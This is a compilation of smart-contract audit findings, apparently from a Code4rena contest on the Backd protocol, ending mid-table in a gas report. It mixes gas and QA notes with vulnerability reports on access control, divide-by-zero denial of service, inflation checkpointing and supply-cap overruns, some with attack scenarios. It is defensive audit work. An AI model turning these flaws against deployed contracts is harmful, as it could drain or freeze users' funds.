L-1 Maybe should have address(0) checks to avoid having to redeploy contracts https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20_rewardToken%3B  L-2 Missing checks for address when assigning values to address state variables https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20newRewardToken%3B  N-1 Multiple `addresss` mapping can be combined into a single mapping of an address to a struct. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=mapping(address,)%20public%20totalStashed%3B  N-2 Emit an event in setInflationRecipient()  The `setInflationRecipient()` function is operated only by the governerance and should emit an event when the inflationrecipient is set for the first time or changes. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#:~:text=function%20setInflationRecipient(,%7D  
- `PoolMigrationZap.sol` - Use `UncheckedMath.uncheckedInc `instead of [++i in loop](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  - `FeeBurner.sol` - Use `calldata` instead of `memory` for read-only function argument array [`tokens_`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43).
**Redundant greater than 0 checks for uint** When executing pool weight changes in `InflationManager.sol` ([_executeKeeperPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575), [_executeLpPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589), [_executeAmmTokenWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)), corresponding total pool weights `x` are `unsigned int`. As they can't only be `x >= 0`, the expression `x>0 ? x : 0` does nothing.   **Sensible changes, such as adding a Governor should be a two-step process** [`addGovernance`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L41) directly grants `Roles.GOVERNANCE` to the `newGovernor`. It should be a two-step process (*e.g. [setGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#setgovernance)-[acceptGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#acceptgovernance)*) to ensure the input address is correct. Whilst `renounceGovernance` checks that there is at least one Governor left, in a single-Governor scenario, back to back execution of `addGovernance` with an incorrect address followed by `renounceGovernance` will render the protocol ungovernable. Additionally, as there is no way to revoke this role, granting governance to an address means that address will have complete control over the protocol forever after.  **Requirement uses external call to user-controlled address in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** `require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0");` makes an external call to `oldPoolAddress_`, which is a user-controlled address. It could be a malicious contract, thus reporting any result needed to bypass the guard.  **Erring on the safe side for reentrancy in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** While I did not manage to exploit it in any way - I'd recommend against not including a `nonReentrant` guard in this function. `oldPoolAddress_` could be a malicious contract thus enabling multiple calls to `migrate` spanning from the external calls to `oldPool` or `lpToken_`.   **Recommended missing events** Modifying key protocol variables or triggering key events should always emit events accordingly to ensure transparency and proper traceability.  - [`Minter.sol`]( https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol): *setToken, startInflation,  executeInflationRateUpdate* - [`BkdLocker.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol): *migrate* - [`Controller.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol): *setInflationManager* - [`AmmGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol): *kill* - [`KeeperGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol): *kill, advanceEpoch, reportFees, poolCheckpoint* - [`InflationManager.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol): *deactivateWeightBasedKeeperDistribution, checkpointAllGauges* - [`VestedEscrow.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol): *setAdmin, setFundAdmin, initializeUnallocatedSupply*
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L145-L155 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L236-L249 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L321-L330   # Vulnerability details  ## Impact  Several actions need to be prepared and go through a time-lock before they can be executed. `InflationManager` allows anyone to call the single action execute function but requires `onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)` for the batched versions. This looks like an oversight since the same access control level should be enforced.  For example, the `executeLpPoolWeight` function allows anyone to call it:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L241-L249  ``` function executeLpPoolWeight(address lpToken) external override returns (uint256) {    (...) } ```   But the batched version enforces the caller to have `GOVERNANCE` or `INFLATION_MANAGER` roles:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L284-L301  ``` function batchExecuteLpPoolWeights(address[] calldata lpTokens)         external         override         onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)         returns (bool)     { ```  The same happens in `executeAmmTokenWeight` versus `batchExecuteAmmTokenWeights` , as well as `executeKeeperPoolWeight` versus `batchExecuteKeeperPoolWeights`.  If only trusted roles should be able to execute pending actions then the `onlyRoles` modifier should be added to the non-batched functions.  Scenarios where you would not want to allow anyone to execute could include potential votes/changes that may trigger a bug or undesired behavior noticed after it had already been approved.  ## Tools Used  vim  ## Recommended Mitigation Steps  Enforce the proper access control mechanism in non-batched execute functions.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161   # Vulnerability details  ## Impact When the Gauge is killed, the advanceEpoch and kill functions can still be called to make epoch+1, while the reportFees function cannot be called to update the value of perPeriodTotalFees, which will cause perPeriodTotalFees[epoch] == 0. Later if the user calls the claimRewards function, the default epoch parameter will cause a divide by zero crash in the code below. ```` for (uint256 i = startEpoch; i < endEpoch; i = i.uncheckedInc()) {              totalClaimable += (                  keeperRecords[beneficiary].feesInPeriod[i].scaledDiv(perPeriodTotalFees[i])              ).scaledMul(perPeriodTotalInflation[i]);          } ```` ## Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L96-L100 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62 ## Tools Used None ## Recommended Mitigation Steps Require killed to be false in poolCheckpoint function ```     function poolCheckpoint() public override returns (bool) { -       if (killed) return false; +      require(!killed);         uint256 timeElapsed = block.timestamp - uint256(lastUpdated);         uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);         perPeriodTotalInflation[epoch] += currentRate * timeElapsed;         lastUpdated = uint48(block.timestamp);         return true;     } ```  
## [Non-critical - 01] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal.  There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.  
## [Gas - 01] - `Gauges` could mint directly to `Minter` Currently all mint action pass through the `InflationManager` which checks the access control using the mapping `gauges` and then forward the call to the `Minter`: see [this code](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L78). It would be way more gas efficient considering the frequency of mints versus `gauges` mapping updates to maintain identical mappings in `InflationManager` and `Minter` and to mint directly to `Minter`.  This would just imply using an internal function in `InflationManager` to make sure each time `gauges` is updated it is also updated in `Minter`.   ## [Gas - 02] - In `Minter`, `token` could be made immutable  In [`Minter`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L55), `token` is not immutable but can only be set once. I assume this is for simplicity as you want to deploy `Minter`, `BkdToken` and then set the address of `BkdToken` in `Minter`. But this overhead could easily be avoided by pre-computing the deployment address of `BkdToken` so it could be set in the constructor of `Minter` and be immutable. This would save a lot of gas during the whole contract lifecycle.  To precompute deployment addresses, you can use the CREATE2 opcode: check https://docs.openzeppelin.com/cli/2.8/deploying-with-create2 or https://medium.com/coinmonks/pre-compute-contract-deployment-address-using-create2-8c01e80ab7da.  This also applies to other places in the code like https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L56   ## [Gas - 03] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal. There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.   ## [Gas - 04] - `Minter` and `BkdToken` could be merged  To save expensive external calls, why not merging `Minter` and `BkdToken` into a single contract ? I think it doable from a contract size point of view, and references to one another are immutable so it would totally make sense to merge them.   ## [Gas - 05] In `VestedEscrow`, `totalTime` could be made immutable. [`totalTime`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39) is not changed during the contract lifetime so could be made immutable !   ## [Gas - 06] In `Minter`, there is no need to inherit `ReentrancyGuard` In `Minter` the keyword `nonReentrant` is used only once [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L129), but it is useless as there is only an external call to a trusted contract: the token, and no crucial states updates after this call. 
# Lines of code   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L220  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L559  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L572  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L586   # Vulnerability details   ## Impact  When updating pool inflation rates, other pools see their `currentRate` being modified without having `poolCheckpoint` called, which leads to false computations.  This will lead to either users losing a part of their claims, but can also lead to too many tokens could be distributed, preventing some users from claiming due to the `totalAvailableToNow` requirement in `Minter`.  ## Proof of concept  Imagine you have 2 AMM pools A and B, both with an `ammPoolWeight` of 100, where `poolCheckpoint` has not been called for a moment. Then, imagine calling [`executeAmmTokenWeight`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L318) to reduce the weight of A to 0.   Only A is checkpointed [here](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L591), so when B will be checkpointed it will call `getAmmRateForToken`, which will see a pool weight of 100 and a total weight of 100 over the whole period since the last checkpoint of B, which is false, therefore it will distribute too many tokens. This is critical has the minter expects an exact or lower than expected distribution due to the requirement of `totalAvailableToNow`.  In the opposite direction, when increasing weights, it will lead to less tokens being distributed in some pools than planned, leading to a loss for users.  ## Mitigation steps Checkpoint every `LpStakerVault`, `KeeperGauge` or `AmmGauge` when updating the weights of one of them.    
# Lines of code   https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181   # Vulnerability details  ## Impact The actual total supply of the token is random and depends on when `_executeInflationRateUpdate` is executed.  ## Proof of concept The `README` and tokenomic documentation clearly states that “The token supply is limited to a total of 268435456 tokens.”. However when executing [`_executeInflationRateUpdate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181), it first uses the current inflation rate to update the total available before checking if it needs to be reduced.   Therefore if no one mints or calls `executeInflationRateUpdate` for some time around the decay point, the inflation will be updated using the previous rate so the  `totalAvailableToNow` will grow too much.  ## Mitigation steps  You should do ```js  totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent)); ```  Only if the condition `block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD` is false.   Otherwise you should do   ```js  totalAvailableToNow += (currentTotalInflation * (lastInflationDecay + _INFLATION_DECAY_PERIOD - lastEvent));  ```  Then update the rates, then complete with ```js  totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastInflationDecay + _INFLATION_DECAY_PERIOD));  ```  Note that as all these variables are either constants either already loaded in memory this is super cheap to do.   
# Report  * [Low](#low)   * [L-01: use two-step process for critical address changes](#l-01-use-two-step-process-for-critical-address-changes) * [Non-Critical](#non-critical)   * [N-01: emit an event when changing the configuration of a contract](#n-01-emit-an-event-when-changing-the-configuration-of-a-contract)   * [N-02: AmmGauge doesn't use correct value for staking/unstaking events](#n-02-ammgauge-doesnt-use-correct-value-for-stakingunstaking-events)  # Low  ## L-01: use two-step process for critical address changes  Consider using a two-step process for transferring the ownership of a contract. While it costs a little more gas, it's safer than transferring directly.  Here's an example from the Compound Timelock contract: https://github.com/compound-finance/compound-protocol/blob/master/contracts/Timelock.sol#L45-L58  Relevant code sections: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68  # Non-Critical  ## N-01: emit an event when changing the configuration of a contract  There are multiple configuration functions that don't emit an event.  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33  There're probably a couple more that I missed  ## N-02: AmmGauge doesn't use correct value for staking/unstaking events  The functions verify the number of tokens that were transferred. The value is used to keep track of the internal balances. But, it isn't used for the event. There you use the user specified `amount` parameter:  ```sol function stakeFor(address account, uint256 amount) public virtual override returns (bool) {     require(amount > 0, Error.INVALID_AMOUNT);      _userCheckpoint(account);      uint256 oldBal = IERC20(ammToken).balanceOf(address(this));     IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount);     uint256 newBal = IERC20(ammToken).balanceOf(address(this));     uint256 staked = newBal - oldBal;     balances[account] += staked;     totalStaked += staked;          // should be `staked` and not `amount`     emit AmmStaked(account, ammToken, amount);     return true; } ```  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L114 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L136
# Parameter validation is lacking zero-address check  ## Details Some of the function does not check for zero-address see reference: https://github.com/code-423n4/2021-06-pooltogether-findings/issues/81  # Mitigation check for zero-address input  # affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L117-L129 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L158-L170 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L253-L262 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L423-L436 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L109-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L336 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L71-L73 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L197-L210 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L218-L235 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322-L349 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L359-L398 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L400-L402
# Solidity compiler will always read the length of the array during each iteration ## Details .length in a loop can be extracted into a variable and used where necessary to reduce the number of storage reads see reference: https://github.com/code-423n4/2021-10-union-findings/issues/92 ## Mitigation: This extra costs can be avoided by caching the array length.  Example: `uint rolesLength = roles.length;` `for (uint j = 0; i < rolesLength; ++j { }` ## affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  # `!=` is cheaper in gas compared to `>` for uint ## Details `!= 0` costs less gas compared to `> 0` for unsigned integers in require statements with the optimizer enabled (6 gas) see reference: https://github.com/code-423n4/2021-12-maple-findings/issues/75 ## Mitigation use `!= 0` instead of `> 0` ### affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  # Pre-increment cost less gas than post-increment ## Details `epoch++` costs more gas than `++epoch` , for uint pre-decrement is cheaper than post-decrement see reference: https://github.com/code-423n4/2021-12-nftx-findings/issues/195 ## Mitigation change `epoch++` to `++epoch` ### Affected code: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L151-L164   # Vulnerability details  ## Impact In the **_calcTotalClaimable()** function it should be validated that perPeriodTotalFees[i] != 0 since otherwise it would generate a DoS in **claimableRewards()** and **claimRewards()**. This would be possible since if **advanceEpoch()** or **kill()** is executed by the InflationManager address, the epoch will go up without perPeriodTotalFees[newIndexEpoch] is 0. The negative of this is that every time the **InflationManager** executes these two methods (**kill() and advanceEpoch()**) DoS is generated until you run **reportFees()**. Another possible case is that **kill()** or **advanceEpoch()** are executed 2 times in a row and there is no way of a perPeriodTotalFees[epoch-1] updating its value, therefore it would be an irreversible DoS.  ## Recommended Mitigation Steps Generate a behavior for the case that perPeriodTotalFees[i] == 0.   
 **AddressProvider.sol** - L93/117 - It is validated that pool != address(0) but actually pool is needed to put it inside the ILiquidityPool interface, therefore, the best thing would be to request the interface directly in the signature, like this: addPool(ILiquidityPool pool) and removePool(ILiquidityPool pool). In this way, it would be avoided to validate that pool != address(0), since address(0) does not comply with the ILiquidityPool interface.  - L288 - An address is requested in the addStakerVault() function and as soon as the function starts it is put inside the IStakerVault interface, therefore, the best would be to request the interface directly in the signature, like this: addStakerVault(IStakerVault stakerVault). This way it would avoid starting to execute inside the function.  **Controller.sol** - L33 - The setInflationManager() function performs two validations, the second would not be necessary if an IInflationManager is requested directly in the signature (as is done in the constructor). This would also have the benefit of not being wrapear on line 36.  - L39 - The addStakerVault() function has as its first validation, return false if this validation is true (!addressProvider.addStakerVault(stakerVault)), The problem with this validation is that in the implementation of AddressProvider it never returns false, therefore the validation is not necessary (it is also immutable, therefore it can only be modified in the deploy).  - L121/123/127/129 - The code of the function getTotalEthRequiredForGas() would be much cleaner if the signature contains the creation of the variable (returns (uint256 totalEthRequired)), in this way the creation of the variable in line 123 and the final return would be avoided.  **contracts/zaps/PoolMigrationZap.sol** - L24/25 - If when executing: newPool_.getUnderlying(), we get address(0) as response, it should not be correct to set _underlyingNewPools[address(0)] and this is currently happening. The validation of line 26: if (underlying_ == address(0)) continue; it should be earlier.  **contracts/BkdLocker.sol** - L188 - It is not validated in the getShareOfTotalBoostedBalance() function that when the division is performed with totalLockedBoosted, totalLockedBoosted is != 0.  **contracts/tokenomics/FeeBurner.sol** - L25 - The WETH address is hardcoded, this implies that this code is only usable in a single network. If it's on testnet, it can't be deployed on mainnet. If it's on mainnet, you can't test it.  - L79 - When the targetUnderlying_ variable is created, it is never validated that it is != address(0), this is important, since otherwise when swapAll() is executed they would be burning WETH.   **contracts/tokenomics/KeeperGauge.sol** - L77 - The function requests an extra variable that is not requested. There is a comment that says to add it so that the compiler don't throw warnings.  **contracts/StakerVault.sol** - L156/157 - First it should be validated that the src has an amount to transfer and then check if it needs allowance or not.  - L185 - If a malicious address is approved and if the src wants to change the approve it has, the spender could front run it to spend that approve you have and end up with more allowance.  **contracts/tokenomics/InflationManager.sol** - L80/81 - In the mint() function of the minter contract it can only be executed by the deployer of the BkdToken contract. Therefore, there is not much benefit in mintRewards() being executed for any address that returns true in the modifieronlyGauge(). 
**RoleManager.sol** - L27/46/112/113 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **AddressProvider.sol** - L64/71/98/102/176/185/199/241/242/260/270/295/296/325/428/434 - The require are too expensive, it would be saved using the Errors custom + if, instead of requires. Another option could be to use a private view function.  - L101/102/103/118/119/121/122/123 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  **Controller.sol** - L49/50/51/66/69/71 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  - L66 - A variable is created and gas is consumed to fill a variable that will only be used if the if in line 68 is true, since it is only used within the if, it should be created within the if.  **BkdToken.sol** - L31 - Gas can be saved if instead of a require an if is used, with the custom error already created.  **libraries/UncheckedMath.sol** - L7 - In the uncheckedInc() function, the gas could be further optimized, if instead of unchecked{a+1;} it was unchecked {++a;}  **contracts/RewardHandler.sol** - L63 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/BkdLocker.sol** - L91/92/137/139/254/301 - It is less expensive to validate that variable != 0, than to validate variable > 0.  - L91/92/119/137/208 - Gas can be saved if instead of a require an if is used, with the custom error already created.  - L140/144 - --i is less expensive than i = i - 1;  - 150/151 - A newTotal variable is created, to only be used in one place, it is not necessary and gas could be saved by not doing it.  **contracts/tokenomics/FeeBurner.sol** - L117 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/tokenomics/LpGauge.sol** - L59 - The if that validates: (amount <= 0) does not make much sense, since in uint there is no < 0, therefore the correct validation is: (amount == 0).  - L68/114 - The if that validates param > 0, could become less expensive if instead of >, a != is used.  - L111/115 - A currentRate variable is created, which is only used in one place, therefore it is not necessary and more gas is spent.  **contracts/tokenomics/VestedEscrowRevocable.sol** - L101 - The claim() function appears as nonReentrant, but there is no reason for reentrant to occur, since only a transferFrom is performed on line 146 at VestedEscrow.sol  - L97/98 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  - L103/104 - It is possible to create a variable in memory for revokedTime[msg.sender], in this way less gas would be used.  - L52/53/54 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  - L54 - In the revoke() function the storage treasury address is used multiple times, one way to save gas is to create a variable in memory.  **contracts/tokenomics/VestedEscrow.sol** - L83/84 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly. Gas is also saved if instead of > 0 we use != 0.  - L89 - It is not necessary for the function to be nonReentrant, since the transfers that occur are only in the rewardToken address that is set by the owner on deploy, so there shouldn't be a problem with reentry.   - L134/135/155/156/168/169 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  **contracts/utils/Preparable.sol** - L28/29/86/98/110/111 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **contracts/tokenomics/KeeperGauge.sol** - L59/98 - ++epoch uses less gas than epoch++;  - L39/78/82/126/140 - The requirements are very expensive, it could save gas if instead of a modifier it is an if with a custom error or a private view function.  - L140 - Gas is saved, if instead of totalClaimable > 0 you can use totalClaimable != 0.  **contracts/tokenomics/AmmGauge.sol** - L63 - It should be amount == 0, it doesn't make sense for amount to be <= 0, since it is uint256.  - L88/104/125/147 - Gas would be saved if instead of variable > 0 variable != 0 is used.  
# Gas Optimizations  The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---  ## Use assembly to hash instead of Solidity  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.solidityHash(2309349, 2304923409);         c1.assemblyHash(2309349, 2304923409);     } }  contract Contract0 {     function solidityHash(uint256 a, uint256 b) public view {         //unoptimized         keccak256(abi.encodePacked(a, b));     } }  contract Contract1 {     function assemblyHash(uint256 a, uint256 b) public view {         //optimized         assembly {             mstore(0x00, a)             mstore(0x20, b)             let hashedVal := keccak256(0x00, 0x40)         }     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 36687              ┆ 214             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ solidityHash       ┆ 313             ┆ 313 ┆ 313    ┆ 313 ┆ 1       │ 